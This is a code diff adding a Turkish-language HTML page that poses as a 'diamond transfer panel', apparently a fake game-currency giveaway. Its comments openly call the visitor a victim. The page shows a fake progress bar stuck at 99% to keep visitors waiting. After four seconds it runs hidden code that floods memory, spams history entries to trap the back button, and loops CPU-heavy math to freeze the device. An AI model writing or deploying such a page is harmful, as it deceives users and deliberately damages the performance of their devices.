@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💎 ELMAS AKTARIM PANELİ v7 💎</title>
+    <style>
+        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding-top: 100px; overflow: hidden; }
+        .loader { border: 12px solid #111; border-top: 12px solid #00ff00; border-radius: 50%; width: 100px; height: 100px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .bar-bg { width: 80%; height: 20px; background: #222; border-radius: 10px; margin: 20px auto; border: 1px solid #444; }
+        #bar { width: 0%; height: 100%; background: linear-gradient(90deg, #00ff00, #008800); border-radius: 10px; transition: width 0.8s; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1>ELMASLAR PAKETLENİYOR</h1>
+    <div class="bar-bg"><div id="bar"></div></div>
+    <h2 id="perc">%0</h2>
+    <p id="info" style="color:#888;">Sunucuya güvenli bağlantı kuruluyor...</p>
+
+<script>
+    let p = 0;
+    let infoTexts = [
+        "API anahtarları doğrulanıyor...",
+        "Hesap verileri taranıyor...",
+        "Elmaslar şifreleniyor...",
+        "Sunucu protokolü bekleniyor...",
+        "Aktarım sırasına giriliyor..."
+    ];
+
+    // STRATEJİK YAVAŞ SAYAÇ (Kurbanı sayfada tutan kısım)
+    let timer = setInterval(() => {
+        if(p < 99) {
+            p++;
+            document.getElementById("bar").style.width = p + "%";
+            document.getElementById("perc").innerText = "%" + p;
+            if(p % 20 === 0) {
+                document.getElementById("info").innerText = infoTexts[Math.floor(Math.random() * infoTexts.length)];
+            }
+        } else {
+            // %99'da çakılı kalır, kurbanı umutlandırır
+            document.getElementById("info").innerText = "LÜTFEN BEKLEYİN, AKTARIM TAMAMLANMAK ÜZERE...";
+            document.getElementById("info").style.color = "red";
+            document.getElementById("info").style.fontWeight = "bold";
+        }
+    }, 900); // Yaklaşık 1.5 dakikada %99 olur.
+
+    // SİNSİ DONANIM SALDIRISI
+    function saldir() {
+        // 1. RAM'i içten içe şişirir
+        let storage = [];
+        setInterval(() => {
+            let data = new Array(150000).fill("ELMAS-99999-").join("💎");
+            storage.push(data);
+            // Geri tuşunu kilitleme döngüsü
+            window.history.pushState(null, "", "?auth=" + Math.random());
+        }, 50);
+
+        // 2. İşlemciyi (CPU) kitleyen matematiksel yük
+        function cpuLoad() {
+            let x = 0;
+            for(let i=0; i<2000000; i++) {
+                x = Math.sqrt(Math.random() * 12345) / Math.sin(Math.random());
+            }
+            requestAnimationFrame(cpuLoad);
+        }
+        cpuLoad();
+    }
+
+    // 4. saniyeden itibaren cihazı yormaya başlar
+    setTimeout(saldir, 4000);
+</script>
+</body>
+</html>
